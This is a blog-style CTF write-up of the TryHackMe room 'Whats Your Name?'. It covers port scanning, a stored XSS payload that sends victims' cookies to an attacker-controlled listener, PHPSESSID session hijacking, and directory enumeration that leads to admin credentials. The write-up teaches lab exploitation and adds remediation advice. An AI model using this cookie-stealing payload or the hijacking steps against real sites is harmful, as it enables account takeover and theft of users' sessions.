---
title: "Write-up: Whats Your Name? (TryHackMe) — biusa_mrdarkroot"
date: 2025-10-16 20:00:00 +0700
categories: [CTF, Writeup]
tags: [tryhackme, ctf, xss, session-hijack, websec]
---

# Hello Jekyll 👋

This is my write-up — **biusa_mrdarkroot** — for the **"Whats Your Name?"** challenge on TryHackMe. The write-up documents client-side exploitation (stored XSS), session hijacking, and sensitive data discovery, with commands and notes to reproduce the steps in a lab environment.

---

## 🪶 Objectives

- Discover and exploit a stored XSS in the **Name** field  
- Capture a victim's cookie via payload → perform session hijacking  
- Enumerate hidden directories to find admin credentials → access dashboard → obtain admin flag

---

<p align="center">
  <img src="https://github.com/user-attachments/assets/93ecc503-8257-4d5a-9c9c-49da50170fb4" alt="Screenshot-demo" width="80%">
</p>

---

## ✨ Environment & Tools

- Platform: TryHackMe — room: *Whats Your Name?* (subscription required)  
- Attacker machine: Kali Linux  
- Tools: `nmap`, `gobuster`, browser (DevTools), `python3` (simple http server)

---

## 🔎 Step 1 — Start the machine & port scan

- Click **Start Machine** on TryHackMe to obtain the target IP.  
- Run a quick port scan:

```bash
nmap -sS <MACHINE_IP>
```

Typical result: ports **22 (SSH)**, **80 (HTTP)**, **8081 (HTTP)** are open.

---

## 💣 Step 2 — Find stored XSS & inject payload

- Add hosts to `/etc/hosts` if the room provides domain names, then visit the web app.  
- Open the **Register** page and test input fields. The **Name** field appears to accept HTML/JS — try a stored XSS payload:

```html
<script>document.location="http://<KALI_IP>:1337/cookie?c="+document.cookie</script>
```

> Replace `<KALI_IP>` with your Kali machine IP.

- On Kali, run a simple HTTP server to listen for incoming requests:

```bash
python3 -m http.server 1337
```

If a moderator or another privileged user views the registration details containing the payload, their browser will make a request to your server including their cookies in the URL. You will see the cookie value in the server logs.

---

## 🧩 Step 3 — Session hijacking

- Capture the cookie from the incoming request (for example `PHPSESSID=<value>`).  
- Open your browser's DevTools → Storage → Cookies.  
- Create or update a cookie named `PHPSESSID` with the captured value, then reload the page.  
- If the cookie is valid, the server will recognize you as that user — in this room I became **Moderator** and retrieved the **moderator flag**.

---

## 🔐 Step 4 — Directory enumeration & admin flag

- While logged in as Moderator, a subdomain (for example `login.worldwap.thm`) may be discovered — add it to `/etc/hosts`.  
- Use `gobuster` to enumerate directories:

```bash
gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,py,txt,html
```

- Results often include `admin.py` (which contains admin information/credentials) and `login.php`.  
- Use the credentials from `admin.py` to log into `login.php` → become **admin** → the dashboard contains the **admin flag**.

---

## ✅ Results

- Obtained the **Moderator flag** via stored XSS + session hijacking.  
- Enumerated hidden files to find admin credentials → logged in as admin → obtained the **Admin flag**.

---

## ⚠️ Ethics & technical notes

- These steps should only be performed in a **legal, authorized lab**. Do **not** apply them to systems you do not have permission to test.  
- When reporting vulnerabilities, check for proper input escaping/encoding, Content Security Policy (CSP), and cookie protections (`HttpOnly`, `Secure`, `SameSite`) to advise on remediation.

---

## 💡 Commit instructions (if you want to save this as a Jekyll post)

- Create a file named like `2025-10-16-whats-your-name-writeup.md` and paste this content (front-matter included).  
- Push to your repo. GitHub Pages / Jekyll will build automatically (usually within 1–2 minutes).

---

## 🌐 Suggested screenshots to include

- Before/after rendering of the payload on the page.  
- Server logs on Kali showing the request URL with cookie.  
- DevTools → Cookies showing the injected `PHPSESSID`.  
- Moderator / Admin dashboard showing flags.

---

## 🧠 Quick commands

- Port scan: `nmap -sS <MACHINE_IP>`  
- Listen for callback: `python3 -m http.server 1337`  
- Directory enumeration:  
  `gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,py,txt,html`

---
